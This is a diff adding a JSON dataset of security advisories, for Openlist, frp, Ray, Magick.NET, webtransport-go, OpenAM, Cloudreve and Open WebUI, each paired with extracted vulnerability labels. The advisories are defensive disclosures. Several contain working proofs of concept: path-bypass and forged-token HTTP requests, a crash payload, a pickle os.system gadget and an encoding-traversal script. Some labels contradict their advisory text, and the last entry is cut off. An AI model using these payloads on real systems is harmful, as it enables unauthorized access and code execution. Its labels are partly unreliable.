@@ -1,0 +1,604 @@
+[
+  {
+    "source_ghsa_id": "GHSA-86cx-wwf4-phq4",
+    "input_text": "### Summary\nAn authorization bypass vulnerability exists in the file sharing mechanism of `Openlist`. Due to a flawed, non-separator-aware path validation check, an authenticated user can create share links for files outside their restricted base directory. This allows an attacker to bypass tenant/user isolation and gain unauthorized read access to arbitrary files within the system.\n\n### Details\nWhen a user attempts to create or update a file share, the application must verify that the requested file path falls within the user's assigned `BasePath`. However, in `server/handles/sharing.go`, this authorization check relies on a simple string prefix function: `strings.HasPrefix(requested_path, user.BasePath)`.\n\nBecause `strings.HasPrefix` does not account for directory separators (e.g., `/`), an attacker whose `BasePath` is assigned to `/base` can supply a target path like `/base2/secret_document.txt`. The validation `strings.HasPrefix(\"/base2/secret_document.txt\", \"/base\")` evaluates to `true`, successfully passing the authorization filter. \n\nOnce the share is created, the public share download/list handlers unwrap and serve the file based on the stored absolute path without re-verifying the creator's current directory scope, granting the attacker horizontal access to unauthorized data.\n\n### PoC\n**Prerequisites:**\n1. A system with at least two distinct directories at the root level: `/base` and `/base2`.\n2. A sensitive file exists at `/base2/secret.txt`.\n3. An attacker account with the `CanShare` permission enabled and its `Base path` strictly limited to `/base`.\n\n**Exploitation Steps:**\n1. Log in as the attacker account and obtain the JWT authorization token.\n2. Send a `POST` request to create a new share, intentionally targeting the unauthorized sibling directory `/base2`:\n\n```http\nPOST /api/share/create HTTP/1.1\nHost: <your-openlist-host>\nAuthorization: <attacker-jwt-token>\nContent-Type: application/json\n\n{\n  \"files\": [\"/base2/secret.txt\"],\n  \"pwd\": \"\",\n  \"max_accessed\": 0\n}\n```\nObserve the bypass: The API accepts the request and responds with a successful share creation message, returning a `share_id`.\n\nThe attacker can now access the public share endpoint (e.g., via the web UI or API `/api/fs/list` / `/sd/<share-id>/...`) to download or view `/base2/secret.txt`, completely bypassing their directory restrictions.\n\n<img width=\"2457\" height=\"1307\" alt=\"7b0bd29c9d12ad0b7b84a4a156559a5b\" src=\"https://github.com/user-attachments/assets/415e4915-dbc2-4738-8c53-8174998b42a9\" />\n\n<img width=\"1937\" height=\"856\" alt=\"90b16bf15b6e8bfb87f16c4ab8864ea7\" src=\"https://github.com/user-attachments/assets/8dc5205e-2ac6-4f4f-9d40-e1e9d72229d5\" />\n\n### Impact\nThis is a High-severity Horizontal and Vertical Privilege Escalation vulnerability. A malicious user with basic sharing privileges can weaponize this path confusion to expose, read, and download any file from other users' directories or internal application paths, provided the target path shares the same string prefix as their own directory. This completely breaks the data isolation guarantees of the application.\n\n### Remediation Recommendations\nCanonical Path Containment: Replace the raw `strings.HasPrefix` check with a robust, separator-aware path containment validation. Ensure both paths are normalized, and use logic such as: `target == base || strings.HasPrefix(target, base + \"/\")`.\n\nCentralized Validation Utility: Implement a dedicated function (e.g., `utils.IsSubPath(base, target)`) and apply it consistently across share creation, updating, and viewing handlers to prevent regressions.\n\n### Credits\n- Thai Son Dinh from VinSOC Labs (R&D)",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/OpenListTeam/OpenList/v4",
+              "version_range": "<= 4.2.3"
+            }
+          ],
+          "cwe_category": "Authorization Bypass Through User-Controlled Key",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can bypass directory restrictions and access unauthorized files by exploiting a flawed authorization check.",
+          "remediation_action": "Replace raw `strings.HasPrefix` with a robust separator-aware path containment validation and implement a centralized utility function to prevent future regressions."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-26gq-p25f-99cp",
+    "input_text": "## Summary\n\nAn integer-overflow vulnerability in the frp server's optional SSH Tunnel Gateway lets any unauthenticated remote attacker crash the entire `frps` process with a single five-byte message. When the gateway parses an SSH `exec` channel request in `pkg/ssh/server.go`, it adds a small constant to a four-byte length value taken directly from the request. Because that length is fully attacker-controlled, a value of `0xFFFFFFFF` makes the addition wrap around to a tiny number, defeating the only bounds check and forcing an out-of-range slice. Go raises a panic that nothing recovers, so the whole server exits. In the default gateway mode SSH clients are not authenticated and the request is handled before any frp token is checked, so the crash is reachable pre-authentication. It carries no state and is trivially repeatable, turning one crash into a sustained outage that drops every tunnel for every user.\n\n## Details\n\nThe `exec` request payload is a four-byte big-endian length followed by that many command bytes, and the length field is fully attacker-controlled. The gateway computes the end of the command as `4 + length`. The constant `4` takes the `uint32` type of the length field, so `4 + 0xFFFFFFFF` wraps modulo 2^32 to `3`. The only guard compares the real payload size against this wrapped value, so a five-byte payload passes the test `5 < 3`, and the slice runs from index 4 to index 3:\n\n```go\n// pkg/ssh/server.go:315-319\nend := 4 + binary.BigEndian.Uint32(req.Payload[:4])  // 4 + 0xFFFFFFFF wraps to 3\nif len(req.Payload) < int(end) {                     // 5 < 3 is false, so it passes\n    continue\n}\nextraPayload := string(req.Payload[4:end])           // payload[4:3] -> panic\n```\n\nThe handler runs in a bare goroutine and no function in the call chain installs a `recover`, so the panic unwinds to the top of the goroutine and terminates the whole process rather than the single connection:\n\n```go\n// pkg/ssh/server.go:226\ngo s.handleNewChannel(newChannel, extraPayloadCh)    // no recover anywhere in the chain\n```\n\nThe sink is reachable without credentials in the default configuration. When no authorized-keys file is set, the gateway disables SSH client authentication, which is the default and documented mode where users authenticate through the frp token embedded in the SSH command. The `exec` request is processed during the channel phase, before that token is validated, so an unauthenticated peer reaches the sink:\n\n```go\n// pkg/ssh/gateway.go:74\nsshConfig.NoClientAuth = cfg.AuthorizedKeysFile == \"\"  // default: no client auth\n```\n\nAffected product: frp (fatedier), `frps` server, SSH Tunnel Gateway\nAffected versions: v0.53.0 (when the gateway was introduced) through v0.70.0, confirmed against a v0.70.0 build\n\n## PoC\n\nThe SSH Tunnel Gateway must be enabled with no authorized-keys file, which is the default mode of any deployment that turns the gateway on. No credentials and no knowledge of the target are required.\n\nEnable the gateway on a stock v0.70.0 build:\n\n```toml\nbindPort = 7000\n\n[sshTunnelGateway]\nbindPort = 2200\n```\n\nAs an unauthenticated SSH client, open a session channel and send one `exec` request whose four-byte length prefix is `0xFFFFFFFF` followed by a single byte, giving the five-byte payload `ff ff ff ff 41`. The server immediately panics and exits:\n\n```text\npanic: runtime error: slice bounds out of range [4:3]\n...github.com/fatedier/frp/pkg/ssh.(*TunnelServer).handleNewChannel\n    .../frp/pkg/ssh/server.go:319\n```\n\nThe shell prompt returns in the server terminal, confirming the whole process has terminated and every other client tunnel is dropped at the same instant. A well-formed request of the same length (prefix `1`) leaves the server running, proving the crash is caused by the overflow value and not by the `exec` request itself. The attacker can re-send the payload after any restart to hold the server down indefinitely.\n\n## Impact\n\nThis is an unauthenticated remote denial of service (CWE-190) leading to an out-of-range array index (CWE-129) and an unhandled process crash (CWE-755). A single five-byte, credential-free message kills the entire `frps` process. Because one `frps` commonly multiplexes the tunnels of many clients, the crash drops every active tunnel for every tenant at once and new logins are refused until the process is restarted, and re-sending the payload after each restart keeps the service down indefinitely (CWE-400). There is no confidentiality or integrity impact and no code execution.\n\nThis issue only affects frps instances with the SSH tunnel gateway explicitly enabled. The SSH tunnel gateway is disabled by default and is not commonly used in typical frps deployments. Default frps configurations are not affected.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/fatedier/frp",
+              "version_range": ">= 0.53.0, <= 0.70.0"
+            }
+          ],
+          "cwe_category": "Improper Validation of Array Index",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "Unauthenticated remote denial of service (DoS) caused by integer overflow vulnerability in frp SSH Tunnel Gateway.",
+          "remediation_action": "Update to a version of frp that addresses this issue."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-hhrp-gw25-jr43",
+    "input_text": "## Summary\n\n`ray.data.read_webdataset(paths=...)` is a `@PublicAPI(stability=\"alpha\")`\nreader for WebDataset-format TAR files. Its default `decoder=True` invokes\n`_default_decoder` on every sample's keys, which routes file extension to a\ndecoder by extension. Two of those branches deserialize attacker-controlled\nbytes with no validation:\n\n- `.pickle` / `.pkl` -> `pickle.loads(value)`\n- `.pt`     / `.pth` -> `torch.load(io.BytesIO(value), weights_only=False)`\n\nBoth fire during a standard `ray.data.read_webdataset(...).take_all()` /\n`.iter_batches()` call. No flags, no opt-in, no environment variable.\nAn attacker who can supply a TAR (via S3 share, HuggingFace Hub mirror,\nemail attachment, model-zoo, or any HTTP URL the user passes to\n`read_webdataset`) achieves arbitrary code execution in the calling\nRay process at schema-sample time, before row data is consumed.\n\nThis is the same class of bug as GHSA-mw35-8rx3-xf9r (Parquet Arrow\nExtension Type cloudpickle deserialization, patched in 2.55.0): standard\ndata-loading API, attacker-controlled file format, deserialization gadget\ninvoked transparently. The 2.55.0 patch addressed\n`tensor_extensions/arrow.py:_deserialize_with_fallback` and made cloudpickle\nopt-in via `RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. The\nWebDataset path is a different code site and was not touched.\n\n## Vulnerable code (HEAD `a157d4d`)\n\n`python/ray/data/_internal/datasource/webdataset_datasource.py` lines\n175-225, the `_default_decoder` function:\n\n```python\ndef _default_decoder(sample, format=True):\n    sample = dict(sample)\n    for key, value in sample.items():\n        extension = key.split(\".\")[-1]\n        ...\n        elif extension in [\"pt\", \"pth\"]:\n            import torch\n            # PyTorch 2.6 changed torch.load default weights_only=True, which\n            # breaks loading general Python objects previously serialized for\n            # WebDataset .pt payloads.\n            sample[key] = torch.load(io.BytesIO(value), weights_only=False)   # line 219\n        elif extension in [\"pickle\", \"pkl\"]:\n            import pickle\n            sample[key] = pickle.loads(value)                                 # line 223\n    return sample\n```\n\nThe comment for the `.pt/.pth` branch is itself a security smell: it\ndocuments that the maintainer chose `weights_only=False` *to override*\nPyTorch 2.6's safer default. The comment treats this as a compatibility\nfix; it functionally re-enables an arbitrary-code-execution path that\nupstream PyTorch closed.\n\n## Reachability and default-on confirmation\n\n`python/ray/data/read_api.py:2289` defines `read_webdataset` with default\n`decoder=True`:\n\n```python\n@PublicAPI(stability=\"alpha\")\ndef read_webdataset(\n    paths,\n    *,\n    ...\n    decoder: Optional[Union[bool, str, callable, list]] = True,\n    ...\n) -> Dataset:\n    ...\n    datasource = WebDatasetDatasource(paths, decoder=decoder, ...)\n```\n\n`WebDatasetDatasource._read_stream` (line 367) calls the decoder\nunconditionally when not None:\n\n```python\nfor sample in samples:\n    if self.decoder is not None:\n        sample = _apply_list(self.decoder, sample, default=_default_decoder)\n```\n\n`True is not None` evaluates True, so the default decoder fires for every\ninvocation that doesn't explicitly pass `decoder=None` (or a custom safe\ndecoder). The documentation does not warn about the behavior.\n\n## End-to-end reproduction\n\nTested on a fresh venv (`pip install ray[data]`) on Linux x86_64. Ray\nreports `__version__ == \"2.55.1\"` (the patched-against-GHSA-mw35 release):\n\n```python\nimport io, os, pickle, subprocess, tarfile, tempfile, sys\n\nMARKER = \"/tmp/ray_webdataset_poc_rce_marker\"\n\nclass Gadget:\n    def __reduce__(self):\n        cmd = (f\"/bin/sh -c \\\"printf 'RCE via ray.data.read_webdataset\\\\n\"\n               f\"pid=%s\\\\nuser=%s\\\\n' \\\"$$\\\" \\\"$(whoami)\\\" > {MARKER}\\\"\")\n        return (os.system, (cmd,))\n\nwith tempfile.NamedTemporaryFile(suffix=\".tar\", delete=False) as f:\n    tar_path = f.name\nwith tarfile.open(tar_path, \"w\") as tar:\n    for name, body in ((\"000000.txt\", b\"hello\"),\n                       (\"000000.pkl\", pickle.dumps(Gadget()))):\n        ti = tarfile.TarInfo(name=name); ti.size = len(body)\n        tar.addfile(ti, io.BytesIO(body))\n\nimport ray, ray.data\nray.init(num_cpus=2, ignore_reinit_error=True, log_to_driver=False)\nds = ray.data.read_webdataset(paths=[tar_path])\nrows = ds.take_all()\nassert os.path.exists(MARKER), \"no RCE\"\nprint(open(MARKER).read())\n```\n\nOutput:\n\n```\nray version: 2.55.1\ncrafted /tmp/tmpjpos115h.tar (10240 bytes)\nds.take_all() returned 1 row(s)\nRCE CONFIRMED:marker at /tmp/ray_webdataset_poc_rce_marker:\n    RCE via ray.data.read_webdataset\n    pid=248816\n    user=xyz\n```\n\nThe `.pt/.pth` variant is the exact same primitive against the\n`torch.load(io.BytesIO(value), weights_only=False)` branch; replace the\nTAR member with `000000.pt` containing `torch.save(Gadget())` to reproduce.\n\n## Real-world delivery vectors\n\n- `paths=[\"s3://bucket/poisoned.tar\"]` -- the user thinks they are reading\n  a WebDataset shard; the bucket is shared, mis-permissioned, or\n  compromised.\n- `paths=[\"https://attacker/model.tar\"]` -- HTTP-served WebDataset.\n- HuggingFace Hub -- WebDataset is a recognized HF dataset format; users\n  pull TAR shards via `datasets` and feed them to Ray Data.\n- Model-zoo / leaderboard tarballs -- common in CV/ASR workflows.\n\n## Why GHSA-mw35 doesn't cover this\n\nGHSA-mw35-8rx3-xf9r patched `tensor_extensions/arrow.py:_deserialize_with_fallback`\nby gating `cloudpickle.loads` behind\n`RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. That change touches\nthe Parquet ExtensionType deserialization path only. The advisory text\ndoes not mention WebDataset, the WebDataset code is in a different\nmodule, and the unsafe loads here use `pickle.loads` and\n`torch.load(weights_only=False)` (not `cloudpickle.loads`).\n\n## Suggested patch\n\nTwo minimal options, both Ray-internal:\n\n1. **Make the unsafe extensions opt-in**, mirroring the GHSA-mw35 fix\n   pattern. Replace the `.pt/.pth` and `.pkl/.pickle` branches with a\n   guard:\n\n   ```python\n   import os\n   _ALLOW_UNSAFE = os.environ.get(\n       \"RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE\", \"0\"\n   ) == \"1\"\n\n   elif extension in [\"pt\", \"pth\"]:\n       if not _ALLOW_UNSAFE:\n           raise ValueError(\n               f\"Refusing to load .pt/.pth member {key!r} from WebDataset \"\n               f\"with weights_only=False. Set \"\n               f\"RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 only for trusted \"\n               f\"sources.\"\n           )\n       sample[key] = torch.load(io.BytesIO(value), weights_only=False)\n\n   elif extension in [\"pickle\", \"pkl\"]:\n       if not _ALLOW_UNSAFE:\n           raise ValueError(\n               f\"Refusing to unpickle WebDataset member {key!r} -- \"\n               f\"untrusted pickle is RCE. Provide your own decoder \"\n               f\"or set RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 for \"\n               f\"trusted sources.\"\n           )\n       sample[key] = pickle.loads(value)\n   ```\n\n2. **Drop these branches from the default decoder entirely** and require\n   callers to provide their own decoder when working with .pkl/.pt\n   samples. This is the safer default, matches WebDataset upstream's\n   guidance (\"by default, use safe decoders\"), and is consistent with\n   the spirit of the GHSA-mw35 patch.\n\nEither option flips the default-on RCE primitive into an explicit\nopt-in. The current default-on behavior provides no signal to users\nthat calling `ray.data.read_webdataset` on an untrusted TAR is\nequivalent to running attacker code.\n\n## References\n\n- Source: `python/ray/data/_internal/datasource/webdataset_datasource.py:175-225`\n- Public API: `python/ray/data/read_api.py:2287-2370` (`read_webdataset`)\n- Sibling advisory of the same class: GHSA-mw35-8rx3-xf9r (Parquet\n  Arrow Extension Type, patched 2.55.0)\n- Earlier related advisory: PR #45084 (2024) fixed PyExtensionType\n  cloudpickle but did not touch the WebDataset decoder.\n- WebDataset format: https://github.com/webdataset/webdataset",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-57516",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "ray",
+              "version_range": "< 2.56.0"
+            }
+          ],
+          "cwe_category": "Improper Control of Generation of Code ('Code Injection')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can achieve arbitrary code execution by supplying a TAR file with a `.pt` or `.pickle` extension through `ray.data.read_webdataset`.",
+          "remediation_action": "Disable the default decoder or use custom safe decoders when reading WebDataset files to prevent arbitrary code execution."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-hwf3-r46v-5ggx",
+    "input_text": "When a profile is displayed with the identify command and the value is not printable a single byte at the end of the profile can be printed.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Out-of-bounds Read",
+          "severity": "low",
+          "attack_vector": "local",
+          "impact_summary": "Displaying a profile with identify command can expose one byte of data beyond intended value",
+          "remediation_action": "Ensure only printable values are exposed when displaying profiles via the identify command"
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-g35j-m5xg-vh3q",
+    "input_text": "## Summary\n\nAn attacker can cause excessive memory allocation in webtransport-go by sending an unknown WebTransport capsule with a large payload. The implementation skips unknown capsules by reading the entire capsule body into memory, instead of draining it without retaining the data. This can lead to memory exhaustion.\n\n## Impact\n\nA misbehaving or malicious peer can cause a denial-of-service (DoS) attack against webtransport-go clients or servers by triggering excessive memory allocation, potentially leading to crashes or resource exhaustion.\n\n## Details\n\nWebTransport sessions use capsules on the HTTP/3 request stream. Unknown capsule types are ignored, but the capsule body still needs to be consumed before the next capsule can be parsed.\n\nwebtransport-go used `io.ReadAll` when skipping unknown capsules. Since the capsule reader is only limited by the capsule's declared length, a peer could send a large unknown capsule and cause the receiver to allocate memory for the full capsule body.\n\nQUIC flow control limits buffered data, but it does not bound total allocation here, since reading the stream advances the flow control window while retaining the received bytes in memory.\n\n## The Fix\n\nwebtransport-go now drains unknown capsules to `io.Discard` instead of buffering them. This consumes the capsule body so parsing can continue, without retaining the payload in memory.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-57497",
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/quic-go/webtransport-go",
+              "version_range": "<= 0.11.0"
+            }
+          ],
+          "cwe_category": "Allocation of Resources Without Limits or Throttling",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "A denial-of-service (DoS) attack can cause clients or servers to crash due to excessive memory allocation.",
+          "remediation_action": "webtransport-go now drains unknown capsules to `io.Discard` instead of buffering them"
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-gf8h-gq53-288j",
+    "input_text": "### Summary\nThe GHSA-6c99-87fr-6q7r fix wrapped WebAuthn authenticator deserialization in an `ObjectInputFilter` meant to allow only `AuthenticatorImpl`, but it short-circuits to `ALLOWED` for any object at stream `depth > 1`. Because the Java serialization filter is consulted for every class in the graph (and `depth == 1` only for the root's concrete class), the allowlist constrains only the root and leaves the entire nested graph unchecked.\n\n### Impact\nAn attacker can craft a stream rooted at `AuthenticatorImpl` with an arbitrary gadget chain nested inside. The gadget's `readObject`/`readResolve` executes during `readObject()` \u2014 before the cast and before any assertion verification \u2014 enabling remote code execution when a gadget is on the classpath. The deserialization sink is reached pre-authentication via an attacker-chosen `userHandle`.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-62263",
+          "affected_products": [
+            {
+              "vendor": "MAVEN",
+              "product": "org.openidentityplatform.openam:openam-auth-webauthn",
+              "version_range": "<= 16.1.1"
+            }
+          ],
+          "cwe_category": "Deserialization of Untrusted Data",
+          "severity": "critical",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can execute arbitrary code by crafting a serialized object with an embedded gadget chain.",
+          "remediation_action": "Fix WebAuthn authenticator deserialization to only allow `AuthenticatorImpl` directly."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-c3jm-gv5r-9wcp",
+    "input_text": "## Summary\n\nCloudreve WOPI access tokens are generated as `<session-id>.<random-secret>`, but the WOPI middleware validates only the session id prefix and never compares the supplied token to the stored token. In addition, a WOPI viewer session does not store or enforce the requested viewer action. A session created for a view or preview action can still call WOPI write routes if the underlying file is writable by the session user.\n\n## Impact\n\nA WOPI integration that is only expected to view a user's file can modify that file through the WOPI write endpoints. If the WOPI URL or session id leaks, the random token suffix does not protect the session because any suffix is accepted for an existing session id.\n\nThis affects deployments that configure WOPI viewers for user files. The attacker primitive is strongest when a malicious or compromised WOPI viewer receives a view-only URL and then writes content back to Cloudreve.\n\n## Affected version\n\nVerified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.\n\n## Technical details\n\nCloudreve creates WOPI viewer sessions in `pkg/filemanager/manager/viewer.go`:\n\n```go\nsessionID := uuid.Must(uuid.NewV4()).String()\ntoken := util.RandStringRunesCrypto(128)\nsessionCache := &ViewerSessionCache{\n    ID:       sessionID,\n    Uri:      file.Uri(false).String(),\n    UserID:   m.user.ID,\n    ViewerID: viewer.ID,\n    FileID:   file.ID(),\n    Version:  version,\n    Token:    fmt.Sprintf(\"%s.%s\", sessionID, token),\n}\n```\n\nThe token includes a 128-character random suffix, but `middleware.ViewerSessionValidation()` only uses the prefix before the dot:\n\n```go\naccessToken := strings.Split(c.Query(wopi.AccessTokenQuery), \".\")\nif len(accessToken) != 2 {\n    ...\n}\n\nsessionRaw, exist := store.Get(manager.ViewerSessionCachePrefix + accessToken[0])\n```\n\nThe middleware checks that the file id matches the loaded session, but it never compares `c.Query(\"access_token\")` with `session.Token`. As a result, `<valid-session-id>.anything` is accepted.\n\nThe WOPI routes are exposed without normal session authentication and rely on this middleware:\n\n```go\nwopi := noAuth.Group(\"file/wopi\", middleware.HashID(hashid.FileID), middleware.ViewerSessionValidation())\nwopi.GET(\":id\", controllers.CheckFileInfo)\nwopi.GET(\":id/contents\", controllers.GetFile)\nwopi.POST(\":id/contents\", controllers.PutFile)\nwopi.POST(\":id\", controllers.ModifyFile)\n```\n\nThe write routes are not protected by a session-level write check. `CreateViewerSessionService` accepts `preferred_action`, but `ViewerSessionCache` has no action or write-permission field and `CreateViewerSession` does not persist the chosen action. The requested action is only used to generate the WOPI source URL:\n\n```go\nwopiSrc, err := wopi.GenerateWopiSrc(c, s.PreferredAction, targetViewer, viewerSession)\n```\n\n`WopiService.PutContent()` checks only the underlying filesystem upload capability:\n\n```go\nfile, err := m.Get(c, uri, dbfs.WithRequiredCapabilities(dbfs.NavigatorCapabilityUploadFile), dbfs.WithNotRoot())\n```\n\nIt does not check whether the WOPI session was created for an edit action.\n\n## Reproduction\n\nThe following sequence was verified against a disposable local Cloudreve instance built from the affected commit.\n\n1. Configure a WOPI viewer in Cloudreve.\n2. Create a user-owned file, for example `cloudreve://my/wopi.txt`, containing `original content`.\n3. Create a viewer session with `preferred_action` set to `view`:\n\n```http\nPUT /api/v4/file/viewerSession HTTP/1.1\nAuthorization: Bearer <user-token>\nContent-Type: application/json\n\n{\n  \"uri\": \"cloudreve://my/wopi.txt\",\n  \"version\": \"\",\n  \"viewer_id\": \"poc-wopi\",\n  \"preferred_action\": \"view\"\n}\n```\n\nObserved response:\n\n```json\n{\n  \"session\": {\n    \"id\": \"a2d03f1b-e310-4b2a-9baf-38556fa2d5d1\",\n    \"access_token\": \"a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.<128-char-random-secret>\"\n  }\n}\n```\n\n4. Replace the token suffix with any value:\n\n```http\nGET /api/v4/file/wopi/4xc5?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1\n```\n\nObserved response: `200 OK`. The same request with an unknown session id returned `403 Forbidden`, confirming the middleware validates the session id prefix but ignores the secret suffix.\n\n5. Use the forged token from the view-created session to read content:\n\n```http\nGET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\nContent-Length: 16\nEtag: \"1bIo\"\n\noriginal content\n```\n\n6. Use the same forged token from the view-created session to write content:\n\n```http\nPOST /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1\nX-WOPI-Lock: cloudreve-poc\nContent-Type: application/octet-stream\n\nruntime modified via view session forged suffix\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\nX-Wopi-Itemversion: nBc0\n```\n\n7. Read back the modified file with the forged token:\n\n```http\nGET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\nContent-Length: 47\nEtag: \"nBc0\"\n\nruntime modified via view session forged suffix\n```\n\nThis proves both authorization failures: the random token suffix is ignored, and a view-created WOPI session can reach the content write sink.\n\n## Root cause\n\nTwo authorization values are generated or accepted but not enforced:\n\n1. The random WOPI token suffix is generated and stored but never compared during WOPI request validation.\n2. The requested WOPI action is accepted during session creation but not persisted or enforced on WOPI write routes.\n\n## Remediation\n\n- Compare the full supplied `access_token` to the stored `ViewerSessionCache.Token` using constant-time comparison.\n- Reject malformed tokens and tokens with extra separators.\n- Store a `CanWrite` flag or selected WOPI action in `ViewerSessionCache`.\n- Enforce that flag on `POST /contents`, `PUT_RELATIVE`, `LOCK`, and other write operations.\n- Include session-level write permission when returning WOPI `FileInfo` fields such as `ReadOnly` and `UserCanWrite`.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-62323",
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v3",
+              "version_range": "<= 3.0.0-20250225100611-da4e44b77af4"
+            },
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v4",
+              "version_range": "< 4.0.0-20260626022433-f3347130ac48"
+            }
+          ],
+          "cwe_category": "Incorrect Authorization",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "WOPI integration with view-only permissions can be exploited to modify files due to weak validation and lack of action enforcement.",
+          "remediation_action": "Implement proper session validation and enforce only read actions for WOPI viewers."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-frvj-c5qp-xj4w",
+    "input_text": "AI assistance was used to help inspect the code and prepare this report.\n\n## Summary\n\nThe fix for GHSA-r2wg-2mcr-66rv is incomplete in v0.9.6 and current main. `backend/open_webui/routers/terminals.py` documents `_sanitize_proxy_path()` as decoding until stable, but the implementation stops after 8 `unquote()` passes. A 9x percent-encoded `../...` path parameter remains once-encoded after the loop, passes the `posixpath.normpath()` and `cleaned.startswith('..')` checks, and is forwarded to the configured terminal server. The upstream server then receives a decoded traversal path such as `/base/../admin/system`.\n\n## Impact\n\nA user who has access to an admin-configured terminal connection can bypass the terminal proxy path traversal guard and cause Open WebUI to forward requests with the configured terminal credentials and `X-User-Id` header to paths outside the intended normalized proxy path. For orchestrator-backed terminal connections the same sanitized path is placed under `/p/{policy_id}/{safe_path}`, so the bypass can also target sibling or parent routes after upstream decoding. This is a bypass of the same terminal proxy boundary covered by GHSA-r2wg-2mcr-66rv.\n\nThis does not require adding a malicious terminal server or convincing an administrator to weaken settings. The attacker only needs normal access to an existing configured terminal connection.\n\n## Reproduction\n\nThe following standalone Python script mirrors the current sanitizer and uses a local aiohttp server as the terminal-server canary. It shows that 8x encoding is rejected but 9x encoding is accepted and forwarded as a traversal after the upstream framework decodes the path.\n\n```python\nimport asyncio, posixpath\nfrom urllib.parse import unquote\nfrom aiohttp import web, ClientSession, ClientTimeout\n\ndef sanitize(path):\n    decoded = path\n    for _ in range(8):\n        once = unquote(decoded)\n        if once == decoded:\n            break\n        decoded = once\n    cleaned = posixpath.normpath(decoded).lstrip('/')\n    if cleaned.startswith('..') or cleaned == '.':\n        return None\n    return cleaned\n\ndef enc(s, rounds):\n    out = ''.join(f'%{b:02X}' for b in s.encode())\n    for _ in range(rounds - 1):\n        out = out.replace('%', '%25')\n    return out\n\nasync def main():\n    async def handler(request):\n        return web.json_response({'raw_path': request.raw_path, 'path': request.path})\n    app = web.Application()\n    app.router.add_route('*', '/{tail:.*}', handler)\n    runner = web.AppRunner(app)\n    await runner.setup()\n    site = web.TCPSite(runner, '127.0.0.1', 0)\n    await site.start()\n    port = site._server.sockets[0].getsockname()[1]\n\n    for rounds in (8, 9):\n        safe = sanitize(enc('../admin/system', rounds))\n        print(rounds, safe)\n        if safe:\n            url = f'http://127.0.0.1:{port}/base/{safe}'\n            async with ClientSession(timeout=ClientTimeout(total=10)) as session:\n                async with session.get(url) as response:\n                    print(await response.json())\n    await runner.cleanup()\n\nasyncio.run(main())\n```\n\nObserved output on current main and v0.9.6 sanitizer:\n\n```text\n8 None\n9 